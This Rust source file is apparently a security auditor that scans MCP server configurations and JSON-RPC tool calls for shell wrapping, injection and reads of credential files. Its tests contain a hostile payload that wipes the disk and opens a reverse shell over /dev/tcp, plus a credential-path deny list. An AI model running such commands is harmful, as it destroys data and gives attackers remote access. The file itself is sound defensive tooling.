use crate::sast::{self, RuleCategory, SastSeverity, VulnerabilityFinding};
use colored::*;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::path::Path;

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct McpConfigFile {
    #[serde(default, rename = "mcpServers")]
    pub mcp_servers: HashMap<String, McpServerEntry>,
}

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct McpServerEntry {
    pub command: String,
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub env: Option<HashMap<String, String>>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct McpAuditReport {
    pub total_servers: usize,
    pub findings: Vec<VulnerabilityFinding>,
    pub clean: bool,
}

/// Audit an MCP configuration file (.agents/mcp_config.json) for security vulnerabilities
pub fn audit_mcp_config(config_path: &Path) -> Result<McpAuditReport, Box<dyn std::error::Error>> {
    let raw = fs::read_to_string(config_path)?;
    let parsed: McpConfigFile = serde_json::from_str(&raw)?;
    let mut findings = Vec::new();

    for (server_name, entry) in &parsed.mcp_servers {
        // 1. Audit executable command vector
        let cmd_findings =
            sast::scan_content(&entry.command, Some(&format!("mcp:{}", server_name)));
        findings.extend(cmd_findings);

        // Check for shell wrapping antipatterns
        if entry.command == "bash" || entry.command == "sh" || entry.command == "cmd.exe" {
            findings.push(VulnerabilityFinding {
                rule_id: "NW-MCP-001".to_string(),
                title: "Shell-Wrapped MCP Server Invocations".to_string(),
                category: RuleCategory::SystemExecution,
                severity: SastSeverity::High,
                file_path: Some(format!("mcp:{}", server_name)),
                line_number: None,
                matched_snippet: format!("command: {}", entry.command),
                recommendation: "Invoke standalone binary directly without shell interpreter wrapper to prevent command expansion.".to_string(),
            });
        }

        // 2. Audit arguments for injections or traversals
        let joined_args = entry.args.join(" ");
        let arg_findings = sast::scan_content(&joined_args, Some(&format!("mcp:{}", server_name)));
        findings.extend(arg_findings);

        // 3. Audit environment variables for exposed secrets
        if let Some(ref env_map) = entry.env {
            for (key, val) in env_map {
                let env_content = format!("{}={}", key, val);
                let env_findings =
                    sast::scan_content(&env_content, Some(&format!("mcp:{}:env", server_name)));
                findings.extend(env_findings);
            }
        }
    }

    let clean = findings.is_empty();
    Ok(McpAuditReport {
        total_servers: parsed.mcp_servers.len(),
        findings,
        clean,
    })
}

/// Inspect a runtime JSON-RPC Model Context Protocol payload
pub fn inspect_mcp_json_rpc(payload: &str) -> Result<(), Box<VulnerabilityFinding>> {
    if let Ok(val) = serde_json::from_str::<serde_json::Value>(payload) {
        let method = val["method"].as_str().unwrap_or("");

        if method == "tools/call" {
            let tool_name = val["params"]["name"].as_str().unwrap_or("unknown");
            let args_str = val["params"]["arguments"].to_string();

            // Run SAST scan on serialized tool call arguments
            let findings = sast::scan_content(&args_str, Some(tool_name));
            if let Some(critical) = findings
                .into_iter()
                .find(|f| f.severity == SastSeverity::Critical || f.severity == SastSeverity::High)
            {
                return Err(Box::new(critical));
            }
        } else if method == "resources/read" {
            let uri = val["params"]["uri"].as_str().unwrap_or("");
            if uri.contains("/etc/shadow") || uri.contains("/etc/passwd") || uri.contains("id_rsa")
            {
                return Err(Box::new(VulnerabilityFinding {
                    rule_id: "NW-MCP-002".to_string(),
                    title: "Sensitive Host Resource URI Access".to_string(),
                    category: RuleCategory::SystemExecution,
                    severity: SastSeverity::Critical,
                    file_path: Some("mcp:resources/read".to_string()),
                    line_number: None,
                    matched_snippet: uri.to_string(),
                    recommendation:
                        "Enforce workspace boundary sandbox; restrict host credential file reads."
                            .to_string(),
                }));
            }
        }
    }

    Ok(())
}

pub fn print_mcp_report(report: &McpAuditReport, path_str: &str) {
    println!(
        "\n{}",
        "================================================================================".blue()
    );
    println!(
        "{}",
        "          NETHER WARD: MODEL CONTEXT PROTOCOL (MCP) SECURITY AUDIT             "
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!("{:<24}: {}", "Config Path".bold(), path_str);
    println!(
        "{:<24}: {}",
        "Configured Servers".bold(),
        report.total_servers
    );
    println!("{:<24}: {}", "Findings Count".bold(), report.findings.len());

    if report.clean {
        println!(
            "{:<24}: {}",
            "Audit Status".bold(),
            "CLEAN (Zero Vulnerabilities Detected)".green().bold()
        );
    } else {
        println!(
            "{:<24}: {}",
            "Audit Status".bold(),
            format!("VULNERABILITIES DETECTED ({})", report.findings.len())
                .red()
                .bold()
        );
        println!(
            "\n{:<12} {:<10} {:<30} {:<24}",
            "RULE ID".bold(),
            "SEVERITY".bold(),
            "TITLE".bold(),
            "TARGET".bold()
        );
        println!(
            "{}",
            "--------------------------------------------------------------------------------"
                .blue()
        );
        for f in &report.findings {
            let sev_colored = match f.severity {
                SastSeverity::Critical => f.severity.to_string().red().bold(),
                SastSeverity::High => f.severity.to_string().red(),
                SastSeverity::Medium => f.severity.to_string().yellow(),
                SastSeverity::Low | SastSeverity::Info => f.severity.to_string().cyan(),
            };
            println!(
                "{:<12} {:<10} {:<30} {:<24}",
                f.rule_id.bold(),
                sev_colored,
                f.title.chars().take(30).collect::<String>(),
                f.file_path.as_deref().unwrap_or("-")
            );
            println!("  Snippet: {}", f.matched_snippet.italic());
            println!("  Fix:     {}", f.recommendation);
            println!();
        }
    }
    println!(
        "{}",
        "================================================================================".blue()
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_inspect_clean_mcp_tool_call() {
        let payload = r#"{"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "read_file", "arguments": {"Path": "/home/user/project/src/main.rs"}}}"#;
        assert!(inspect_mcp_json_rpc(payload).is_ok());
    }

    #[test]
    fn test_inspect_hostile_mcp_tool_call() {
        let payload = r#"{"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "run_command", "arguments": {"CommandLine": "rm -rf / && /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1"}}}"#;
        let res = inspect_mcp_json_rpc(payload);
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert_eq!(err.category, RuleCategory::SystemExecution);
    }

    #[test]
    fn test_inspect_sensitive_mcp_resource() {
        let payload = r#"{"jsonrpc": "2.0", "id": 3, "method": "resources/read", "params": {"uri": "file:///etc/shadow"}}"#;
        let res = inspect_mcp_json_rpc(payload);
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert_eq!(err.rule_id, "NW-MCP-002");
    }

    #[test]
    fn test_audit_clean_mcp_config() {
        let temp_path = std::env::temp_dir().join("test_clean_mcp.json");
        let content = r#"{
            "mcpServers": {
                "git": { "command": "mcp-server-git", "args": ["--repo", "/tmp/repo"] },
                "fetch": { "command": "mcp-server-fetch", "args": [] }
            }
        }"#;
        fs::write(&temp_path, content).unwrap();
        let report = audit_mcp_config(&temp_path).unwrap();
        assert_eq!(report.total_servers, 2);
        assert!(report.clean);
        let _ = fs::remove_file(temp_path);
    }

    #[test]
    fn test_audit_vulnerable_mcp_config() {
        let temp_path = std::env::temp_dir().join("test_vuln_mcp.json");
        let content = r#"{
            "mcpServers": {
                "insecure": {
                    "command": "bash",
                    "args": ["-c", "eval $(cat secret.txt)"],
                    "env": {
                        "AWS_SECRET": "AKIAIOSFODNN7EXAMPLE"
                    }
                }
            }
        }"#;
        fs::write(&temp_path, content).unwrap();
        let report = audit_mcp_config(&temp_path).unwrap();
        assert_eq!(report.total_servers, 1);
        assert!(!report.clean);
        assert!(report.findings.iter().any(|f| f.rule_id == "NW-MCP-001"));
        assert!(report.findings.iter().any(|f| f.rule_id == "NW-SEC-001"));
        let _ = fs::remove_file(temp_path);
    }
}
